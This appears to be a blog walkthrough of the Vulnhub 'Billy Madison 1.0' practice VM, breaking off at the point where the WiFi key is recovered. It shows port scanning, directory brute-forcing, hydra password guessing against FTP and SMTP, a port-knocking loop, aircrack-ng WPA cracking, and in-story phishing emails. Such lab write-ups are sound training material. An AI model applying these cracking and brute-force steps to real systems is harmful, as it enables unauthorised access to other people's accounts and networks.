---
layout: post
title:  "Vulnhub - Billy Madison 1.0"
date:   2016-09-14 15:07:19
categories: [walkthrough]
comments: true
---
So I came across [Billy Madison 1.0](https://www.vulnhub.com/entry/billy-madison-11,161/), a recently published vulnerable system. As I had really enjoyed this author's previous [Tommy Boy 1.0](https://www.vulnhub.com/series/tommy-boy,91/), I decided to have at it.  Boy was it fun, but I did run across a few hurdles along the way due to my thinking.
<!--more-->

Plot: Help Billy Madison stop Eric from taking over Madison Hotels!

Sneaky Eric Gordon has installed malware on Billy's computer right before the two of them are set to face off in an academic decathlon. Unless Billy can regain control of his machine and decrypt his 12th grade final project, he will not graduate from high school. Plus, it means Eric wins, and he takes over as head of Madison Hotels!

So downloaded the VM, got it up and running setup on the same network as my Kali box, off to the races.

## Host Discovery

First up, lets figure out what IP it is running under as it was configured with NAT I chose to enumerate only that network:

{% highlight bash %}
root@kali:~# netdiscover -r 192.168.244.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                    

 10 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 600                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.244.157 00:0c:29:ee:12:4f      2     120  VMware, Inc.                                                   
 192.168.244.1   00:50:56:c0:00:08      1      60  VMware, Inc.                                                   
root@kali:~# -
{% endhighlight %}

Excellent, `192.168.244.157` it is.

## Enumeration/Port Mapping

First off, trusty nmap against all TCP ports( -p 0-65535) and Service Detection (-sv):

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# nmap 192.168.244.157 -oA host -sV
-p 0-65535

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-12 13:32 MDT
Nmap scan report for 192.168.244.157
Host is up (0.00022s latency).
Not shown: 65527 filtered ports
PORT     STATE  SERVICE     VERSION
22/tcp   open   tcpwrapped
23/tcp   open   telnet?
69/tcp   open   http        BaseHTTPServer
80/tcp   open   http        Apache httpd 2.4.18 ((Ubuntu))
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2525/tcp open   smtp
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port23-TCP:V=7.25BETA2%I=7%D=9/12%Time=57D70352%P=x86_64-pc-linux-gnu%r
SF:(NULL,E6,"\n\n\*\*\*\*\*\x20HAHAH!\x20You're\x20banned\x20for\x20a\x20w
SF:hile,\x20Billy\x20Boy!\x20\x20By\x20the\x20way,\x20I\x20caught\x20you\x
SF:20trying\x20to\x20hack\x20my\x20wifi\x20-\x20but\x20the\x20joke's\x20on
SF:\x20you!\x20I\x20don't\x20use\x20ROTten\x20passwords\x20like\x20rkfpuzr
SF:ahngvat\x20anymore!\x20Madison\x20Hotels\x20is\x20as\x20good\x20as\x20M
SF:INE!!!!\x20\*\*\*\*\*\n\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2525-TCP:V=7.25BETA2%I=7%D=9/12%Time=57D70358%P=x86_64-pc-linux-gnu
SF:%r(NULL,1F,"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n")%r(GetReques
SF:t,5A,"220\x20BM\x20ESMx20SubEthaSMTP\x20null\r\n500\x20Error:\x20com
SF:mand\x20not\x20implemented\r\n500\x20Error:\x20bad\x20syntax\r\n")%r(Ge
SF:nericLines,4D,"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n500\x20Erro
SF:r:\x20bad\x20syntax\r\n500\x20Error:\x20bad\x20syntax\r\n")%r(Help,13D,
SF:"220\x20BM\x20ESMTP\x20SubEthaSMTP\x20null\r\n214-SubEthaSMTP\x20null\x
SF:20on\x20BM\r\n214-Topics:\r\n214-\x20\x20\x20\x20\x20HELP\r\n214-\x20\x
SF:20\x20\x20\x20HELO\r\n214-\x20\x20\x20\x20\x20RCPT\r\n214-\x20\x20\x20\
SF:x20\x20MAIL\r\n214-\x20\x20\x20\x20\x20DATA\r\n214-\x20\x20\x20\x20\x20
SF:AUTH\r\n214-\x20\x20\x20\x20\x20EHLO\r\n214-\x20\x20\x20\x20\x20NOOP\r\
SF:n214-\x20\x20\x20\x20\x20RSET\r\n214-\x20\x20\x20\x20\x20VRFY\r\n214-\x
SF:20\x20\x20\x20\x20QUIT\r\n214-\x20\x20\x20\x20\x20STARTTLS\r\n214-For\x
SF:20more\x20info\x20use\x20\"HELP\x20<topic>\"\.\r\n214\x20End\x20of\x20H
SF:ELP\x20info\r\n");
MAC Address: 00:0C:29:EE:12:4F (VMware)
Service Info: Host: BM

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.83 seconds
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Some interesting results there, 2 services that were not able to be ID'd, HTTP on two ports, telnet, ssh, and smb.

## TCP/80 - HTTP (Apache) - Round 1

I decided to go for HTTP next and pulled up the page to find a defaced website.  The source for the page was as follows:

{% highlight html %}
<html><head><title>Oh nooooooo!</title>

</head><body><p>
</p><center><h1> UH OH!</h1></center>
<p>
</p><center><img src="eric-tongue-animated.gif"></center>
<p>
</p><center><h1>Silly Billy!!!</h1></center>
<p>
</p><center><h3>If you're reading this, you clicked on the link I sent you.
  OH NOES!  Your computer's all locked up, and now you can't get access to
your final 12th grade assignment you've been working so hard on!  You need
that to graduate, Billy Boy!!</h3></center>
<p>
</p><center><h3>Now all I have to do is sit and wait for a while and...</h3>
</center>
<p>
</p><center><img src="hotels.gif"></center>
<p>
</p><center><h2>I bet this is you right now:</h2></center>
<p>
</p><center><img src="billy-mad.png"><img src="billy-mad.png">
<img src="billy-mad.png"></center>
<p>
</p><p></p><center><h2>Think you can get your computer unlocked and recover
your final paper before time runs out and you FAAAAIIIILLLLL?????</h2>
</center>
<p>
</p><center>Good luck, schmuck.</center>
<p>

</p></body></html>
{% endhighlight %}

I then proceeded to download all the images, check them with exiftool and binwalk to see if anything was hidden.  Nothing of interest here sadly.

## TCP/69 - HTTP (BaseHTTPServer) - Funny Wordpress Installation

Next up HTTP on port 69.  This contained what appeared to be a Wordpress site, quick inspection indicated that there was something amiss, links did not appear to work outside of login, the login page was not in the standard location, and searching was completely broken.  At this point I'm thinking honeypot, and considering the service shows up as BaseHTTPServer which I recall being python's SimpleHTTPServer it seems probable, but lets be thorough with wpscan:

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# wpscan 192.168.244.157:69
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

The plugins directory 'wp-content/plugins' does not exist.
You can specify one per command line option (don't forget to include the wp-content directory if needed)
[?] Continue? [Y]es [N]o, default: [N]
y
[+] URL: http://192.168.244.157:69/
[+] Started: Mon Sep 12 14:03:37 2016

[!] The WordPress 'http://192.168.244.157:69/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: MadisonHotelsWordpress
[+] XML-RPC Interface available under: http://192.168.244.157:69/xmlrpc.php

[+] WordPress version 1.0 identified from meta generator (Released on 2004-01-03)

[+] WordPress theme in use: twentyeleven

[+] Name: twentyeleven
 |  Latest version: 2.5
 |  Location: http://192.168.244.157:69/wp-content/themes/twentyeleven/
 |  Readme: http://192.168.244.157:69/wp-content/themes/twentyeleven/readme.txt
 |  Changelog: http://192.168.244.157:69/wp-content/themes/twentyeleven/changelog.txt
 |  Style URL: http://192.168.244.157:69/wp-content/themes/twentyeleven/style.css
 |  Referenced style.css: http://192.168.244.157:69/static/wp-content/themes/twentyeleven/style.css

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Finished: Mon Sep 12 14:03:37 2016
[+] Requests Done: 59
[+] Memory used: 15.527 MB
[+] Elapsed time: 00:00:00
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

No plugins, just one theme.  I also re-ran it with --enumerate u and got nothing.  Yep feels odd, and since I have no idea on usernames or passwords lets back burner this for now.

## TCP/22 - SSH

Attempting to connect to 22 instantly returned a rejection message stating keys were required.  Nothing to see here.

## TCP/23 - Telnet - Or is it?

Attempting to connect to 23 returns a slightly odd error:

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# telnet 192.168.244.157
Trying 192.168.244.157...
telnet: Unable to connect to remote host: Network is unreachable
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Ok lets go look at the NMAP results:

{% highlight bash %}
SF-Port23-TCP:V=7.25BETA2%I=7%D=9/12%Time=57D70352%P=x86_64-pc-linux-gnu%r
SF:(NULL,E6,"\n\n\*\*\*\*\*\x20HAHAH!\x20You're\x20banned\x20for\x20a\x20w
SF:hile,\x20Billy\x20Boy!\x20\x20By\x20the\x20way,\x20I\x20caught\x20you\x
SF:20trying\x20to\x20hack\x20my\x20wifi\x20-\x20but\x20the\x20joke's\x20on
SF:\x20you!\x20I\x20don't\x20use\x20ROTten\x20passwords\x20like\x20rkfpuzr
SF:ahngvat\x20anymore!\x20Madison\x20Hotels\x20is\x20as\x20good\x20as\x20M
SF:INE!!!!\x20\*\*\*\*\*\n\n");
{% endhighlight %}

There was definitely some text returned and after cleaning it up the following text is seen:

{% highlight text %}
***** HAHAH! You're banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke's on you! I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****
{% endhighlight %}

Interesting, so Billy attempted to hack Eric's Wifi, and another insult is thrown.  The very interesting part here is `ROTten` passwords" and `rkfpuzrahngvat`.  My first thought, ROT-10 cipher.

Created a small python script to give all possible ROT combinations to see if anything jumped out at me:

{% highlight python %}
from string import *
import sys
for n in range (26):
  print translate(sys.argv[1],maketrans(lowercase, lowercase[n:]+lowercase[:n]))
{% endhighlight %}

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# python rot.py rkfpuzrahngvat | tee rotpass.txt
rkfpuzrahngvat
slgqvasbiohwbu
tmhrwbtcjpixcv
unisxcudkqjydw
vojtydvelrkzex
wpkuzewfmslafy
xqlvafxgntmbgz
yrmwbgyhouncha
zsnxchzipvodib
atoydiajqwpejc
bupzejbkrxqfkd
cvqafkclsyrgle
dwrbgldmtzshmf
exschmenuating
fytdinfovbujoh
gzuejogpwcvkpi
havfkphqxdwlqj
ibwglqiryexmrk
jcxhmrjszfynsl
kdyinsktagzotm
lezjotlubhapun
mfakpumvcibqvo
ngblqvnwdjcrwp
ohcmrwoxekdsxq
pidnsxpyfletyr
qjeotyqzgmfuzs
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Ok, Nothing really jumped out there sadly, but I'll save those off for later use if needed.

## TCP/80 - HTTP - Round 2!

I was at a bit of a loss at this point, so I proceeded to use some other enumeration tools including nikto, dirbuster, and zap.   Sadly none of then bore any really good fruit.

Finally, since all I had at this point was the ROT cipherd text I decided to do dirb with the list as a wordless.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# dirb http://192.168.244.157 rotpass.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 16 13:30:33 2016
URL_BASE: http://192.168.244.157/
WORDLIST_FILES: rotpass.txt

-----------------

GENERATED WORDS: 26                                                            

---- Scanning URL: http://192.168.244.157/ ----
==> DIRECTORY: http://192.168.244.157/exschmenuating/                                                             

---- Entering directory: http://192.168.244.157/exschmenuating/ ----

-----------------
END_TIME: Fri Sep 16 13:30:33 2016
DOWNLOADED: 52 - FOUND: 0
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Huzzah!  We found a directory `entering exschumerating`.

Retrieving that page presented us with Eric's first backdoor gem.

{% highlight html %}
<head><title>Eric's Admin Console 1.0</title>

</head><body><h1>"Ruin Billy Madison's Life" - Eric's notes</h1>
<p>
</p><center><h1>08/01/16</h1></center>
Looks like Principal Max is too much of a goodie two-shoes to help me ruin Billy Boy's life.  Will ponder other victims.

<center><h1>08/02/16</h1></center>
Ah!  Genius thought!  Billy's girlfriend Veronica uses his machine too.  I might have to cook up a phish and see if I can't get her to take the bait.

<center><h2>08/03/16</h2></center>
OMg LOL LOL LOL!!!  What a twit - I can't believe she fell for it!!  I .captured the whole thing in this folder for later lulz.  I put "veronica" somewhere in the file name because I bet you a million dollars she uses her name as part of her passwords - if that's true, she rocks!
se
Anyway, malware installation successful.  I'm now in complete control of Bill's machine!

<center>
<center><h1>Log monitor</h1></center>
<p>
</p><center>This will help me keep an eye on Billy's attempt to free his machine from my wrath.</center>
<p>
</p><center><a href="currently-banned-hosts.txt">View log</a>
<p>

</p></center></center></body>
{% endhighlight %}

OK, some interesting points, looking at the `currently-banned-hosts.txt` resulted in it showing my system as being blocked.  It also specified that the only way to revert it was to reboot the system which I went ahead and did just incase it had other adverse affects.

Onto the text, the particular pieces that I found interesting were `.captured`, `veronica` and `rocks`.  As it indicated that she would rock if her password contained veronica I jumped to using the `rockyou` password dump and creating a custom wordlist from it.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt
root@kali:~/evidence/billymadison1.0# cat /usr/share/wordlists/rockyou.txt | grep veronica > veronica.txt
root@kali:~/evidence/billymadison1.0# wc -l veronica.txt
773 veronica.txt
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

This reduced my potential passwords down from 14 million to a manageable 733.  Sadly I still had no locations to attempt to log in to (other than the fake WordPress) so I moved onto the `.captured` clue.  Unfortunately my first attempts to find the file ended in failure, so I decided to look elsewhere. (Silly typos)

## TCP/2525 - SMTP -

SMTP identified as `220 BM ESMTP SubEthaSMTP null`.  A bit of research came up with it was a Java library.  I attempted to use `VRFY` to identify emails but it all failed.  I then considered doing a client side attack and send veronica an email with a beef backdoor in case she was active and opening links (blondes...).  However this did not pan out, no links were clicked so I abandoned that idea.

## TCP/445 - SMB - Guest Mode

I went ahead and enumerated SMB to see what could be found there:

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# nmap --script smb-enum-shares.nse -p445 192.168.244.157

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-12 14:15 MDT
Nmap scan report for 192.168.244.157
Host is up (0.00013s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:EE:12:4F (VMware)

Host script results:
| smb-enum-shares:
|   account_used: guest
|   EricsSecretStuff:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\WeaselLaugh
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (BM)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Sweet, `EricsSecretStuff` available anonymously with `READ/WRITE` permissions, that could be useful.  Connection to the share resulted in some files, confusion, and disappointment.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0/ftp/eric# smbclient \\\\192.168.244.157\\EricsSecretStuff
WARNING: The "syslog" option is deprecated
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Fri Sep 16 14:15:15 2016
  ..                                  D        0  Sat Aug 20 12:56:45 2016
  ._.DS_Store                        AH     4096  Wed Aug 17 08:32:07 2016
  160916031515031.eml                 N      436  Fri Sep 16 14:15:15 2016
  ebd.txt                             N       53  Fri Sep 16 14:37:01 2016
  .DS_Store                          AH     6148  Wed Aug 17 08:32:12 2016

                30291996 blocks of size 1024. 25838420 blocks available
smb: \>
root@kali:~/evidence/billymadison1.0/ftp/eric# -
{% endhighlight %}

Retrieving the files shows `ebd.txt` to say that "Eric's Backdoor is CLOSED", good to know.  And the .eml file actually contained the data I sent veronica!  I attempted to edit the file and put new files only to find that nmap was incorrect and we had Read-Only privileges.

So whatever I email gets placed into this directory, interesting... is this a monitoring technique, or something else?  At this point I spent some time thinking how I could exploit this, but as I could not edit files it wasn't a proper form of placing files on the system, and since I couldn't execute it was pointless.

Lets try to enumerate other users, I try `veronica` first.

{% highlight hydra %}
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-09-13 13:22:08

[DATA] max 16 tasks per 1 server, overall 64 tasks, 801 login tries (l:1/p:801), ~0 tries per task
[DATA] attacking service smtp on port 2525
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[2525][smtp] host: 192.168.244.157 login: veronica password: veronicamars
[STATUS] attack finished for 192.168.244.157 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-09-13 13:22:09
{% endhighlight %}

Excellent!  Veronica's password!.... well.... not really.   False positive =(.

I decided to cut my losses so and go back to the admin console.

## TCP/80 - HTTP - Here we go again

I went ahead and ran dirb again, this time, looking for any file that was in the `veronica.txt` password file with the `.captured` extension.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# dirb http://192.168.244.157/exschmenuating/ veronica.txt -X .captured

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 16 13:37:17 2016
URL_BASE: http://192.168.244.157/exschmenuating/
WORDLIST_FILES: veronica.txt
EXTENSIONS_LIST: (.captured) | (.captured) [NUM = 1]

-----------------

GENERATED WORDS: 763                                                           

---- Scanning URL: http://192.168.244.157/exschmenuating/ ----
+ http://192.168.244.157/exschmenuating/veronica$%.captured (CODE:400|SIZE:307)                                  

-----------------
END_TIME: Fri Sep 16 13:37:17 2016
DOWNLOADED: 763 - FOUND: 1
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

No dice.

Well hoping it was some sort of pcap file I decided to try `.pcap` next with the same results.  At this point google to the rescue, the other file types Wireshark can read are `.cap` and `.dmg`.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# dirb http://192.168.244.157/exschmenuating/ veronica.txt -X .cap

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 16 13:44:36 2016
URL_BASE: http://192.168.244.157/exschmenuating/
WORDLIST_FILES: veronica.txt
EXTENSIONS_LIST: (.cap) | (.cap) [NUM = 1]

-----------------

GENERATED WORDS: 763                                                           

---- Scanning URL: http://192.168.244.157/exschmenuating/ ----
+ http://192.168.244.157/exschmenuating/veronica$%.cap (CODE:400|SIZE:307)                                        
+ http://192.168.244.157/exschmenuating/012987veronica.cap (CODE:200|SIZE:8700)                                   

-----------------
END_TIME: Fri Sep 16 13:44:36 2016
DOWNLOADED: 763 - FOUND: 2
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Success!  `012987veronica.cap exists`.  I proceed to download and open it in Wireshark and follow each TCP stream in succession.  This provided a series of emails that Eric described earlier about how he got Veronica to fall for the phishing scam.

{% highlight smtp %}
EHLO kali
MAIL FROM:<eric@madisonhotels.com>
RCPT TO:<vvaughn@polyfector.edu>
DATA
Date: Sat, 20 Aug 2016 21:56:50 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: VIRUS ALERT!
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/

Hey Veronica,

Eric Gordon here.

I know you use Billy's machine more than he does, so I wanted to let you know that the company is rolling out a new antivirus program for all work-from-home users. Just <a href=http://areallyreallybad.malware.edu.org.ru/f3fs0azjf.php>click here</a> to install it, k?

Thanks. -Eric
.
QUIT
{% endhighlight %}

Ok initial phish here.

{% highlight smtp %}
EHLO kali
MAIL FROM:<vvaughn@polyfector.edu>
RCPT TO:<eric@madisonhotels.com>
DATA
Date: Sat, 20 Aug 2016 21:57:00 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:00 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE: VIRUS ALERT!

Eric,

Thanks for your message. I tried to download that file but my antivirus blocked it.

Could you just upload it directly to us via FTP? We keep FTP turned off unless someone connects with the Spanish Armada combo.

https://www.youtube.com/watch?v=z5YU7JwVy7s

-VV
.
QUIT
{% endhighlight %}

Interesting, port knocking to enable FTP.  Will check that youtube in a bit.

{% highlight smtp %}
EHLO kali
MAIL FROM:<eric@madisonhotels.com>
RCPT TO:<vvaughn@polyfector.edu>
DATA
Date: Sat, 20 Aug 2016 21:57:11 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:11 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[2]: VIRUS ALERT!

Veronica,

Thanks that will be perfect. Please set me up an account with username of eric and password ericdoesntdrinkhisownpee.

-Eric
.
QUIT
{% endhighlight %}

Excellent!  Another potential username/password! (A hilarious one at that.)

{% highlight smtp %}
EHLO kali
MAIL FROM:<eric@madisonhotels.com>
RCPT TO:<vvaughn@polyfector.edu>
DATA
Date: Sat, 20 Aug 2016 21:57:31 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:31 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[4]: VIRUS ALERT!

Veronica,

Great, the file is uploaded to the FTP server, please go to a terminal and run the file with your account - the install will be automatic and you won't get any pop-ups or anything like that. Thanks!

-Eric
.
QUIT
{% endhighlight %}

And here begins the attack.

{% highlight smtp %}
EHLO kali
MAIL FROM:<vvaughn@polyfector.edu>
RCPT TO:<eric@madisonhotels.com>
DATA
Date: Sat, 20 Aug 2016 21:57:41 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:41 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[5]: VIRUS ALERT!

Eric,

I clicked the link and now this computer is acting really weird. The antivirus program is popping up alerts, my mouse started to move on its own, my background changed color and other weird stuff. I'm going to send this email to you and then shut the computer down. I have some important files I'm worried about, and Billy's working on his big 12th grade final. I don't want anything to happen to that!

-V
.
QUIT
{% endhighlight %}

Eric has gained access to Billy's system.  

## Port Knocking to FTP

Ok lets follow in those steps.  The youtube video https://www.youtube.com/watch?v=z5YU7JwVy7s provides an amusing little bit of Billy Madison along with a series of numbers that should be the port knocking code to get in.

`1066, 1215, 1466, 1467, 1469, 1514, 1981, 1986` perfect I have the port knock sequence all set, or so I thought.  I attempted to then knock using a simple bash script:

{% highlight bash %}
for x in 1066 1215 1466 1467 1469 1514 1981 1986; do nc -p 44423 $x; sleep 2; done;
{% endhighlight %}

Fail!  Next I tried the nmap command instead, still nothing.  What else.  OK, maybe its the first two with the correct Spanish Armada `1588`, no dice.  I then proceed to try UDP and a ton of various other combinations all failed.  And then I listened to the video again and wrote down precisely what he said for the Spanish Armada - `1466 67 1469 1514 1981 1986 1588`.

{% highlight bash %}
for x in 1466 67 1469 1514 1981 1986 1588; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.244.157; done
root@kali:~/evidence/billymadison1.0# ftp 192.168.244.157
Connected to 192.168.244.157.
220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
Name (192.168.244.157:root): eric
331 User name okay, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
ftp> ls -al
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
226 Transfer completed.
ftp> -
{% endhighlight %}

Score!  I proceeded to download all the files, five of which were local priv escalation exploits (score!) and a `.notes` file.

{% highlight text %}
Ugh, this is frustrating.  

I managed to make a system account for myself. I also managed to hide Billy's paper
where he'll never find it.  However, now I can't find it either :-(.
To make matters worse, my privesc exploits aren't working.  
One sort of worked, but I think I have it installed all backwards.

If I'm going to maintain total control of Billy's miserable life (or what's left of it)
I need to root the box and find that paper!

Fortunately, my SSH backdoor into the system IS working.  
All I need to do is send an email that includes
the text: "My kid will be a ________ _________"

Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs

The new secret port will be open and then I can login from there with my wifi password, which I'm
sure Billy or Veronica know.  I didn't see it in Billy's FTP folders, but didn't have time to
check Veronica's.

-EG
{% endhighlight %}

All right!  Another video to watch and Eric's backdoor!  But some bad news, his privsec exploits now fail (thinking maybe they need to be modified to a different target?) and he lost the paper!  Go figure...

Also an interesting note, he mentions reusing his his wifi password as his login.  I wonder if that would be one of the ROT passwords earlier...

Watching the video results in Billy saying Eric's kid will be a `soccer player`.  Now to send an email.  I modified my previous client side attack script to just send the text and shipped it out.

I once again checked the `edb.txt` file on the SMB share now to find it said "OPEN".  Excellent, now where is it?  Not wanting to get locked out I ran the following nmap:

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# nmap -p0-22,24-65535 192.168.244.157

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-14 15:17 MDT
Nmap scan report for BM (192.168.244.157)
Host is up (0.00024s latency).
Not shown: 65525 filtered ports
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
1974/tcp open   drp
2525/tcp open   ms-v-worlds
MAC Address: 00:0C:29:EE:12:4F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 104.14 seconds
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Success! new port opens on `1974`.  I attempted to log in as eric using the ROT passwords...



...and FAILURE.  Damn ok, what did I miss.  Eric mentioned he looked at veronica's FTP but not billy's.  Lets go ahead and look at Veronica's FTP.  Attempting to login with `veronica:012987veronica` but that fails.  Ok lets try some hydra action!

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# hydra -l veronica -P veronica.txt 192.168.244.157 ftp
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-09-16 14:41:55
[DATA] max 16 tasks per 1 server, overall 64 tasks, 773 login tries (l:1/p:773), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.244.157   login: veronica   password: babygirl_veronica07@yahoo.com
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-09-16 14:42:14
root@kali:~/evidence/billymadison1.0# -
{% endhighlight %}

Score! Valid password of `babygirl_veronica07@yahoo.com` for the account `veronica`.  Connecting to the server yields some files:

{% highlight bash %}
root@kali:~/evidence/billymadison1.0# ftp 192.168.244.157
Connected to 192.168.244.157.
220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
Name (192.168.244.157:root): veronica
331 User name okay, need password.
Password: babygirl_veronica07@yahoo.com
230 User logged in, proceed.
Remote system type is UNIX.
ftp> ls -al
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 595 Aug 20 12:55 email-from-billy.eml
-rwxrwxrwx 1 ftp 719128 Aug 17 12:16 eg-01.cap
226 Transfer completed.
ftp> -
{% endhighlight %}

Well, we have another pcap file and an email from Billy, perhaps it will let us know what is contained within.

## WiFi Password Cracking

Looking through the email from Billy to Veronica, it seems he was trying to break Eric's WiFi password but did not finish, chances are the PCAP file we downloaded contains something that will help.

{% highlight email-from-billy.eml %}
Sat, 20 Aug 2016 12:55:45 -0500 (CDT)
Date: Sat, 20 Aug 2016 12:55:40 -0500
To: vvaughn@polyfector.edu
From: billy@madisonhotels.com
Subject: test Sat, 20 Aug 2016 12:55:40 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
Eric's wifi

Hey VV,

It's your boy Billy here.  Sorry to leave in the middle of the night but I wanted to crack Eric's wireless and then mess with him.
I wasn't completely successful yet, but at least I got a start.

I didn't walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-)

Kisses,

Billy
{% endhighlight %}

While downloading the PCAP file and made the cardinal sin of downloading a binary file in ASCII mode.  After chasing my tail for a bit, getting corrupted file errors, I re-download but `set binary` before hand and voila! we have a non-corrupted PCAP download.  

Seeing as we need to crack wireless I decided to use `Aircrack-ng` and once again utilizing the `rockyou` dump.

{% highlight bash %}
root@kali:~/evidence/billymadison1.0/ftp/veronica# aircrack-ng eg-01.cap -E EricGordon -w /usr/share/wordlists/rockyou.txt

                               Aircrack-ng 1.2 rc4

      [00:08:10] 1699644/9822768 keys tested (3678.11 k/s)

      Time left: 36 minutes, 48 seconds                         17.30%

                           KEY FOUND! [ triscuit* ]


